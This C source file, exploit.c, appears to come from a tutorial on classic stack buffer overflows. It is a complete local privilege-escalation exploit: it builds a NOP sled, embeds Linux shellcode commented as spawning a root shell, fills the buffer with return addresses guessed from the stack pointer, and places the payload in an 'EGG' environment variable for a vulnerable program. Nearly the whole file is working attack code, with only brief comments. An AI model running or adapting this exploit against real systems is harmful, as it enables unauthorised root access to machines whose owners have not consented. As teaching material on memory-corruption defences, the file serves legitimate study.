/* exploit.c */
#include <unistd.h>
#include <stdlib.h>

 
/* default offset is 0 */
#define DEFOFFSET 0

/* default buffer size is 512, by knowing that our vulnerable */
/* program’s buffer is 512 bytes */

#define DEFBUFFSIZE 512
/* No-operation instruction */
#define NOP 0x90


/* our shellcode that spawn a root shell */
char hellcode[ ] = "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68"
                "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

/* getting the esp, so that we can determine the return address */
unsigned long getesp(void)
{__asm__("movl %esp, %eax");}

int main(int argc, char *argv[])
{
    /* declare and initialize some of the variables */
    char *buff, *ptr;
    long *addr_ptr, retaddr;
    int i, offset=DEFOFFSET, buffsize=DEFBUFFSIZE;

    /* If 1st argument supplied, it is the buffer size, else use default */
    if(argc>1)
    buffsize = atoi(argv[1]);
    /* If 2nd argument is supplied, it is the offset, else use default */
    if(argc>2)
    offset = atoi(argv[2]);
    /* using the heap buffer, for our string construction */
    if(!(buff = malloc(buffsize)))
    {printf("Memory allocation for buffer failed lor!\n");
    exit (0);
    }

    /* get the return address */
    retaddr = getesp() - offset;
    
    /* just to display some data */
    printf("Using the address: %0X\n", retaddr);
    printf("The offset is: %0X\n", offset);
    printf("The buffer size is: %0x\n", buffsize);
    ptr = buff;
    addr_ptr = (long *)ptr;

    /* copy the return address into the buffer, by word size */
    for (i=0; i< buffsize; i+=4)
        *(addr_ptr++) = retaddr;
    /* copy half of the buffer with NOP, by byte size */
    for (i=0; i < buffsize/2; i++)
        buff[i] = NOP;
    /* copy the shellcode after the NOPs, by byte */
    ptr = buff + ((buffsize/2) - (strlen(hellcode)/2));
    for (i=0; i < strlen(hellcode); i++)
            *(ptr++) = hellcode[i];
    /* Terminate the string’s buffer with NULL */
    buff[buffsize-1] = '\0';
    /* Now that we've got the string built */

    /* Copy the "EGG=" string into the buffer, so that we have "EGG=our_string" */
    memcpy(buff, "EGG=", 4);
    /* Put the buffer, "EGG=our_string", in the environment variable,
    as an input for our vulnerable program*/
    putenv(buff);
    /* run the root shell, after the overflow */
    system("/bin/bash");
    return 0;
}